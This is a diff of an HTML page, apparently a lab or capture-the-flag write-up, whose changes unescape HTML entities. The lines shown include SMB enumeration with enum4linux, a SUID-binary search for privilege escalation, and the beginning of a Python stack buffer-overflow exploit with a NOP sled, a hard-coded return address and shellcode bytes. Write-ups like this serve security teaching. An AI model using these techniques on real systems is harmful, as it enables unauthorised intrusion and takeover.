@@ -398,7 +398,7 @@
 </p>
 <p>Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux</p>
 <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">139,445 - Pentesting SMB</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">enum4linux -A &lt;IP&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">enum4linux -A <IP>
 </code></pre></div><p>
 
 
@@ -447,7 +447,7 @@
 <p>We can now login and exploit the binaries</p>
 <h2 id="privilege-escalation-1-suid-binary" class="relative group">Privilege escalation #1: SUID binary <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-1-suid-binary" aria-label="Anchor">#</a></span></h2>
 <p>We can begin by locating a binary with SUID bit set.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -u<span class="o">=</span>s -type f 2>/dev/null
 </code></pre></div><p>
 
 
@@ -675,7 +675,7 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
 <span class="n">payload_len</span> <span class="o">=</span> <span class="mi">616</span>
 <span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">200</span>
-<span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
+<span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;<Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
 <span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s2">&#34;</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class="s2">&#34;</span>
